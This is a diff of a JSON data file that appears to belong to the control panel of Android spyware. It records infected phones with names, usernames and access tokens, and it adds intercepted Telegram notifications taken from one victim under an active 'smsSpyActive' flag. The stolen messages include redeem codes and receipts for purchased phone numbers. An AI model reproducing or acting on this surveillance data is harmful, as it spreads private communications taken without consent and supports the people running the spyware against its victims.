@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777349594862,
+    "lastSeen": 1777349603868,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -450,7 +450,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777349596873,
+    "lastSeen": 1777349605881,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -4483,7 +4483,7 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777349595861,
+    "lastSeen": 1777349604788,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
@@ -4499,6 +4499,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ ubilll・19244 pesan baru dari 153 obrolan",
+        "time": "28/04 11:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777349606132
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: ⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ⸙ꠋꠋꠋꠋꠋꠋꠋ",
+        "content": "Aduh",
+        "time": "28/04 11:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777349597791
+      },
+      {
+        "appName": "Telegram",
+        "sender": "BOT GACHA ITEM VIP",
+        "content": "🎁 KODE REDEEM BARU!\n\n📌 Kode: EPQOAJOU\n💎 Bonus: +1 Limit\n⏰ Berlaku 24 jam\n\n/redeem EPQOAJOU",
+        "time": "28/04 11:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777349597700
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: United States 🇺🇸\n• Server: Server (2)\n• Nomor: +1 24********97\n• Waktu: 28/04/2026, 11.01",
+        "time": "28/04 11:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777349597561
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal Shop Nokos Monitor Harga",
+        "content": "📈 UPDATE HARGA TELEGRAM\n\n📍 Negara: Indonesia\n🕐 Waktu: 28/4/2026, 11.04.48\n📊 Total Server: 94\n📦 Stok Total: 4098\n\n━━━━━━━━━━━━━━━━━━━\n\n🔴 HARGA NAIK!\n\nServer 83\n💰 Rp 1.800 → Rp 2.400\n📈 Naik Rp 600 (33.3%)\n📊 Rate: 100% | 📦 Stok: 10\n\nServer 84\n💰 Rp 1.550 → Rp 2.400\n📈 Naik Rp 850 (54.8%)\n📊 Rate: 100% | 📦 Stok: 10\n\n━━━━━━━━━━━━━━━━━━━\n\n🎯 ACTION\n• Order sekarang untuk harga terbaik\n• Harga dapat berubah sewaktu-waktu\n• Stok terbatas",
+        "time": "28/04 11:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777349597527
+      },
       {
         "appName": "Telegram",
         "sender": "⏤͟͟𝐀𝐅 || Jmbt PanjangV2",
